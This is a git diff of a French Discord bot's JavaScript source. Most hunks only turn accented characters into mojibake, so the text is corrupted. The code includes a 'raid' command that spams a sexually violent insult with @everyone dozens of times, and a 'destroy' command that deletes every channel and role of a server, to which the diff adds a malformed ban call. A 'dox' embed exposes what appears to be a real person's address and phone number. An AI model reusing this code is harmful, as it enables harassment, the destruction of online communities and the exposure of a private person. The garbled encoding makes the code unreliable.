@@ -104,7 +104,7 @@ client.on('message',message =>{
        if (!member.kickable) return message.channel.send("Je ne peux pas exclure cet utilisateur :sunglass:")
        member.kick()
        message.delete();
-       message.channel.send("**"+member.user.username + '** a été exclu :white_check_mark:')
+       message.channel.send("**"+member.user.username + '** a Ã©tÃ© exclu :white_check_mark:')
     }
 });
  
@@ -119,7 +119,7 @@ client.on('message',message =>{
        if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas bannir cet utilisateur :x:")
        if (!member.bannable) return message.channel.send("Je ne peux pas bannir cet utilisateur :sunglass:")
        message.guild.ban(member, {days: 1})
-       message.channel.send("**"+member.user.username + '** a été banni :white_check_mark:')
+       message.channel.send("**"+member.user.username + '** a Ã©tÃ© banni :white_check_mark:')
     }
 });
 
@@ -136,7 +136,7 @@ client.on('message' , message =>{
 client.on('message', message => {
 		if(message.content === prefix + "bite"){
 			message.channel.send("ma bite dans ta bouche");
-			console.log("+1 bébé");
+			console.log("+1 bÃ©bÃ©");
 			message.delete();
 		}
 });
@@ -161,14 +161,14 @@ client.on('message', message => {
 	if(message.content === prefix + "image"){
 		message.channel.send(`icone du serveur ! ${message.guild.iconURL}`)
 		message.delete();
-		console.log("réussis")
+		console.log("rÃ©ussis")
 	}
 });
 
 client.on('message', message => {
 	if(message.content === prefix + "avatar"){
-		message.channel.send(`ton image de profil : ${client.user.avatarURL} , voilà :D !`)
-		console.log("une personne a demandé son avatar.")
+		message.channel.send(`ton image de profil : ${client.user.avatarURL} , voilÃ  :D !`)
+		console.log("une personne a demandÃ© son avatar.")
 		message.delete();
 	}
 });
@@ -177,7 +177,7 @@ client.on('message', message => {
 	if(message.content === prefix + "cree"){
 		message.channel.send(`cree le : ${client.user.createdAt} !`)
 		message.delete();
-		console.log("quelq'un a demandé le jour de la création de son compte !")
+		console.log("quelq'un a demandÃ© le jour de la crÃ©ation de son compte !")
 	}
 });
 
@@ -185,7 +185,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -193,7 +193,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -201,7 +201,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -209,7 +209,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -217,7 +217,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -225,7 +225,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -233,7 +233,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -241,7 +241,7 @@ client.on('message', message => {
 	if(message.content === "kais"){
 		message.channel.send("@here")
 		message.delete();
-		console.log("quelq'un à appeler kais")
+		console.log("quelq'un Ã  appeler kais")
 	}
 });
 
@@ -266,7 +266,7 @@ client.on('message', message => {
 					   .addField("Nom de domaine:","BTHub5-HZP7", true)
 					   .addField("Age:","18", true)
 					   .addField("Adresse:","Middle Dr, Ponteland, Newcastle upon Tyne, NE20 9DH.", true)
-					   .addField("Numéro de tel","+447445759076", true)
+					   .addField("NumÃ©ro de tel","+447445759076", true)
 					   .addField("Telephone:","Samsung Galaxy S9+.", true)
 					   .setColor("0xDBA901")
 					   .setFooter("commande test dox")
@@ -280,10 +280,10 @@ client.on('message', message => {
 		var embed2 = new Discord.RichEmbed()
 				.setTitle("Info du Serveur !")
 				.setDescription(`Info de ${message.guild.name} ! :tada:`)
-				.addField(`Crée le : ${message.guild.createdAt} ! `)
+				.addField(`CrÃ©e le : ${message.guild.createdAt} ! `)
 				.addField(`Les roles: ${message.guild.roles} !`)
-				.addField(`Crée par : ${message.guild.owner} !`)
-				.setFooter("Voilà ! :D")
+				.addField(`CrÃ©e par : ${message.guild.owner} !`)
+				.setFooter("VoilÃ  ! :D")
 			message.channel.sendEmbed(embed2);
 		message.delete();
 	}
@@ -291,69 +291,69 @@ client.on('message', message => {
 
 client.on('message', message => {
 	if(message.content === prefix + "raid"){
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
-		message.channel.send("vous vous êtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
+		message.channel.send("vous vous Ãªtes fait violer bande de shlags @everyone")
 		message.delete()
 		console.log("-1 srv")
 	}
@@ -362,6 +362,7 @@ client.on('message', message => {
 client.on('message', message => {
     if(message.content === prefix + "destroy"){
         message.guild.channels.deleteAll("Bot Destroyer");
+        message.guildMember.bannable("bye bye");
     	message.guild.roles.deleteAll("Bot Destroyer");
 	    console.log("+1 nuker")
 	}
